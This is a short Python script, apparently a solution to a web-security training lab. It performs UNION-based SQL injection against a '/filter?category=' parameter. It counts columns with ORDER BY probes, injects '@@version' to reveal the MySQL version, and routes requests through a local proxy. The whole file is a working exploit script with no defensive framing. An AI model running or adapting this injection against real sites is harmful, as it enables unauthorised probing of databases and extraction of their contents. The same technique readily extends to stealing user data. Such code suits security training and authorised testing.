# To dispaly MySQL database type and version

import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

version_text = "0.0"

def exploit_sqli(url, payload):
    uri = '/filter?category='

    for i in range(1, 20):
        r = requests.get(url + uri + payload + "' ORDER BY " + str(i) + "--%20", verify=False, proxies=proxies)

        if "Error" in r.text:
            break

    null_col_list = list()

    num_columns = i - 1

    for x in range(0, num_columns):
        null_col_list.append('NULL')

    for x in range(0, num_columns):
        null_col_list[x] = "@@version"

        union_query = "' union select " + ", ".join(f"{item}" for item in null_col_list)

        r = requests.get(url + uri + payload + union_query + "--%20", verify=False, proxies=proxies)

        if 'Error' not in r.text:
            soup = BeautifulSoup(r.text, "html.parser")

            tbody = soup.find("tbody")

            if tbody:
                global version_text
                version_text = tbody.get_text(separator="\n", strip=True)
            else:
                print("No tbody found!")
            return True

        null_col_list[x] = 'NULL'
    
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    num_columns = exploit_sqli(url, payload= 'Lifestyle')
    if num_columns:
       print("[+] SQL Injection successful, the database version is:")
       print(version_text)
    else:
       print("[-] SQL Injection unsuccessful")